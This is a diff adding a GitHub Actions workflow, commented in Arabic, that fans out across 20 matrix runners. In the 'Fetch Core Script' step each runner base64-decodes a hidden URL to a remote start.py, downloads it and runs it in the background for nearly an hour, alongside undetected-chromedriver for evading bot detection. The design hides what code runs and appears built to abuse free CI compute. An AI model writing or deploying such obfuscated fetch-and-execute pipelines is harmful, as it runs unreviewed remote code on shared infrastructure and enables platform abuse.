@@ -1,1 +1,109 @@
+name: Horizon Engine Matrix Core
 
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: horizon-core-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Watchdog: مراقبة مدة التشغيل وإلغاء سير العمل بعد 59 دقيقة
+  # =================================================================
+  engine-watchdog:
+    name: "System Watchdog Supervisor"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      WATCHDOG_TIMEOUT_SEC: 3540
+    steps:
+      - name: Initialize Supervisor
+        run: |
+          echo "--> [SUPERVISOR] Watchdog process registered for Execution ID: ${{ github.run_id }}"
+          echo "--> [SUPERVISOR] Countdown initialized for ${WATCHDOG_TIMEOUT_SEC} seconds."
+
+          sleep "${WATCHDOG_TIMEOUT_SEC}"
+
+          echo "--> [SUPERVISOR] Threshold reached. Issuing global cancellation request..."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "--> [SUPERVISOR] Termination signal broadcasted to active pipelines."
+
+  # =================================================================
+  # Worker Nodes: تشغيل التوازي للعقد عبر الماتريكس
+  # =================================================================
+  matrix-workers:
+    name: "Worker-${{ matrix.node_code }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_code: [
+          "NODE-A101", "NODE-A102", "NODE-B201", "NODE-B202", 
+          "NODE-C301", "NODE-C302", "NODE-D401", "NODE-D402", 
+          "NODE-E501", "NODE-E502", "NODE-F601", "NODE-F602", 
+          "NODE-G701", "NODE-G702", "NODE-H801", "NODE-H802", 
+          "NODE-X901", "NODE-X902", "NODE-Z001", "NODE-Z002"
+        ]
+
+    steps:
+      # -----------------------------------------------------------------
+      # المرحلة الأولى: تجهيز بيئة التشغيل
+      # -----------------------------------------------------------------
+      - name: Environment Bootstrap
+        run: |
+          echo "==> Preparing system environment for worker: ${{ matrix.node_code }}..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # -----------------------------------------------------------------
+      # المرحلة الثانية: جلب ملف التشغيل البرمجي
+      # -----------------------------------------------------------------
+      - name: Fetch Core Script
+        run: |
+          echo "==> Fetching execution module..."
+          REMOTE_SRC=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$REMOTE_SRC" -o runner_script.py
+          echo "==> Core module retrieved successfully."
+
+      # -----------------------------------------------------------------
+      # المرحلة الثالثة: إعداد المكتبات والاعتماديات
+      # -----------------------------------------------------------------
+      - name: Load Dependencies
+        run: |
+          echo "==> Installing Python dependencies..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # -----------------------------------------------------------------
+      # المرحلة الرابعة: تنفيذ السكربت ووضعه تحت المراقبة الزمانية
+      # -----------------------------------------------------------------
+      - name: Execute Main Process
+        run: |
+          echo "==> Starting core worker engine for ${{ matrix.node_code }}..."
+
+          python3 runner_script.py &
+          TASK_PID=$!
+
+          echo "==> Worker running in background (PID: $TASK_PID). Max duration: 3540s."
+
+          sleep 3540
+
+          if kill -0 "$TASK_PID" 2>/dev/null; then
+            echo "==> Execution limit hit — force closing PID: $TASK_PID."
+            kill -9 "$TASK_PID"
+            echo "==> Process terminated."
+          else
+            echo "==> Task completed prior to cutoff."
+          fi
